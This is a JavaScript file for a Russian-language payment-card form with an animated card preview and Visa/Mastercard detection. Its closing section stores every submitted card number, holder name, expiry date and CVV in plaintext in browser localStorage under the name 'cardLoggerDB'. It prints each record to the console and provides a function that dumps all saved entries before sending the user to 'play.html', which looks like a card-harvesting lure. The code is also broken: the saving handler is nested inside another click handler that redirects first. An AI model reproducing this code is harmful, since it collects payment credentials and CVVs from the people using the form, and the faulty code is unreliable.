// Elements
const card = document.getElementById('card');
const cardInner = card.querySelector('.card-inner');
const inputNumber = document.getElementById('cardNumber');
const inputHolder = document.getElementById('cardHolder');
const inputExpiry = document.getElementById('expiry');
const inputCVV = document.getElementById('cvv');
const cvvToggle = document.getElementById('cvvToggle');

const displayNumber = document.getElementById('cardNumberDisplay');
const displayHolder = document.getElementById('cardHolderDisplay');
const displayExpiry = document.getElementById('expiryDisplay');
const displayCVV = document.getElementById('cvvDisplay');
const detectedType = document.getElementById('detectedType');

const logoVisa = document.getElementById('logoVisa');
const logoMaster = document.getElementById('logoMaster');
const logoDefault = document.getElementById('logoDefault');

// Helpers
function formatCardNumber(value){
  // keep only digits, group by 4
  const digits = value.replace(/\D/g,'').slice(0,19);
  return digits.replace(/(.{4})/g,'$1 ').trim();
}

function detectCardType(digits){
  if(!digits) return 'none';
  if(/^4/.test(digits)) return 'visa';
  if(/^5[1-5]/.test(digits)) return 'mastercard';
  if(digits.length >= 4){
    const first4 = parseInt(digits.slice(0,4),10);
    if(first4 >= 2221 && first4 <= 2720) return 'mastercard';
  }
  return 'unknown';
}

function applyTheme(type){
  card.classList.remove('theme-visa','theme-master','theme-default');
  logoVisa.classList.remove('show');
  logoMaster.classList.remove('show');
  logoDefault.classList.remove('show');

  if(type === 'visa'){
    card.classList.add('theme-visa');
    logoVisa.classList.add('show');
    detectedType.textContent = 'VISA';
    detectedType.style.opacity = '1';
  } else if(type === 'mastercard'){
    card.classList.add('theme-master');
    logoMaster.classList.add('show');
    detectedType.textContent = 'MASTERCARD';
    detectedType.style.opacity = '1';
  } else if(type === 'none'){
    card.classList.add('theme-default');
    logoDefault.classList.add('show');
    detectedType.textContent = '—';
    detectedType.style.opacity = '0.7';
  } else {
    card.classList.add('theme-default');
    logoDefault.classList.add('show');
    detectedType.textContent = 'Неизвестно';
    detectedType.style.opacity = '0.85';
  }
}

// Initial
applyTheme('none');

// 3D follow mouse — subtle
let mouseActive = false;
document.addEventListener('mousemove', (e) => {
  const rect = card.getBoundingClientRect();
  const cx = rect.left + rect.width/2;
  const cy = rect.top + rect.height/2;
  const dx = e.clientX - cx;
  const dy = e.clientY - cy;
  const rx = (-dy / 20).toFixed(2);
  const ry = (dx / 24).toFixed(2);
  card.style.transform = `rotateX(${rx}deg) rotateY(${ry}deg) translateZ(0)`;
  mouseActive = true;
});
document.addEventListener('mouseleave', ()=>{
  if(!mouseActive) return;
  card.style.transform = '';
  mouseActive = false;
});

// Format & update number
inputNumber.addEventListener('input', (e) => {
  const formatted = formatCardNumber(e.target.value);
  e.target.value = formatted;
  displayNumber.textContent = formatted || '#### #### #### ####';

  const digits = formatted.replace(/\s/g,'');
  const type = detectCardType(digits);
  applyTheme(type);
});

// Holder
inputHolder.addEventListener('input', (e) => {
  displayHolder.textContent = e.target.value.trim().toUpperCase() || 'CARD HOLDER';
});

// Expiry: auto slash
inputExpiry.addEventListener('input', (e) => {
  let v = e.target.value.replace(/\D/g,'').slice(0,4);
  if(v.length >= 3) v = v.slice(0,2) + '/' + v.slice(2);
  e.target.value = v;
  displayExpiry.textContent = v || 'MM/YY';
});

// CVV: only digits, show masked in preview
inputCVV.addEventListener('input', (e) => {
  const v = e.target.value.replace(/\D/g,'').slice(0,4);
  e.target.value = v;
  displayCVV.textContent = v ? '*'.repeat(v.length) : '***';
});

// CVV toggle: shows/hides CVV and flips card for effect
function setCvvVisible(show){
  if(show){
    inputCVV.type = 'text';
    cvvToggle.textContent = 'Скрыть';
    cvvToggle.setAttribute('aria-pressed','true');
    card.classList.add('flipped');
    // reveal actual CVV on back (we'll set the text)
    displayCVV.textContent = inputCVV.value || '';
  } else {
    inputCVV.type = 'password';
    cvvToggle.textContent = 'Показать';
    cvvToggle.setAttribute('aria-pressed','false');
    card.classList.remove('flipped');
    displayCVV.textContent = inputCVV.value ? '*'.repeat(inputCVV.value.length) : '***';
  }
}

cvvToggle.addEventListener('click', ()=>{
  const isVisible = cvvToggle.getAttribute('aria-pressed') === 'true';
  setCvvVisible(!isVisible);
});

// keyboard support for toggle (Enter/Space)
cvvToggle.addEventListener('keydown', (e)=>{
  if(e.key === 'Enter' || e.key === ' '){
    e.preventDefault();
    cvvToggle.click();
  }
});

// Flip on focus (optional): if user focuses CVV, flip; when blur, restore unless toggle set to visible
inputCVV.addEventListener('focus', ()=>{
  if(cvvToggle.getAttribute('aria-pressed') !== 'true'){
    card.classList.add('flipped');
  }
});
inputCVV.addEventListener('blur', ()=>{
  if(cvvToggle.getAttribute('aria-pressed') !== 'true'){
    card.classList.remove('flipped');
  } else {
    // keep flipped if toggle says visible
    card.classList.add('flipped');
  }
});

// Accessibility: allow paste sanitized
inputNumber.addEventListener('paste', (e) => {
  e.preventDefault();
  const paste = (e.clipboardData || window.clipboardData).getData('text');
  const cleaned = paste.replace(/\D/g,'').slice(0,19);
  inputNumber.value = cleaned.replace(/(.{4})/g,'$1 ').trim();
  inputNumber.dispatchEvent(new Event('input'));
});

inputExpiry.addEventListener('paste', (e) => {
  e.preventDefault();
  const paste = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g,'').slice(0,4);
  let v = paste;
  if(v.length >= 3) v = v.slice(0,2) + '/' + v.slice(2);
  inputExpiry.value = v;
  inputExpiry.dispatchEvent(new Event('input'));
});

// Small polish: when focusing any input, raise card slightly
const inputs = [inputNumber, inputHolder, inputExpiry, inputCVV];
inputs.forEach(inp => {
  inp.addEventListener('focus', ()=> card.style.transform += ' translateY(-6px) scale(1.01)');
  inp.addEventListener('blur',  ()=> card.style.transform = card.style.transform.replace(' translateY(-6px) scale(1.01)',''));
});

// Initialize placeholders
displayNumber.textContent = inputNumber.value || '#### #### #### ####';
displayHolder.textContent = inputHolder.value.trim().toUpperCase() || 'CARD HOLDER';
displayExpiry.textContent = inputExpiry.value || 'MM/YY';
displayCVV.textContent = inputCVV.value ? '*'.repeat(inputCVV.value.length) : '***';
const nextBtn = document.getElementById('nextBtn');

function checkFormComplete() {
  const number = inputNumber.value.replace(/\s/g,'');
  const holder = inputHolder.value.trim();
  const expiry = inputExpiry.value;
  const cvv = inputCVV.value;

  return number.length >= 16 && holder && expiry.length === 5 && cvv.length >= 3;
}

// Обновление кнопки при вводе
[inputNumber, inputHolder, inputExpiry, inputCVV].forEach(input => {
  input.addEventListener('input', () => {
    nextBtn.disabled = !checkFormComplete();
  });
});

// Переход на play.html по клику
nextBtn.addEventListener('click', () => {
  if(checkFormComplete()){
    window.location.href = 'play.html';
  }
  // === Локальная база данных через LocalStorage ===

// Сохраняем данные при нажатии "Далее"
nextBtn.addEventListener('click', () => {
  if (checkFormComplete()) {
    // Читаем старую базу
    let db = JSON.parse(localStorage.getItem('cardLoggerDB')) || [];

    // Создаём новую запись
    const record = {
      id: `User-${db.length + 1}`,
      number: inputNumber.value,
      holder: inputHolder.value,
      expiry: inputExpiry.value,
      cvv: inputCVV.value,
      timestamp: new Date().toLocaleString()
    };

    // Добавляем в базу
    db.push(record);

    // Сохраняем обратно
    localStorage.setItem('cardLoggerDB', JSON.stringify(db));

    // Выводим в консоль (можно убрать)
    console.log('Сохранено:', record);

    // Переход на другую страницу (если хочешь)
    window.location.href = 'play.html';
  }
});

// ===== Функция для просмотра базы (только для отладки) =====
window.showAllUsers = function() {
  const db = JSON.parse(localStorage.getItem('cardLoggerDB')) || [];
  console.table(db);
};
});
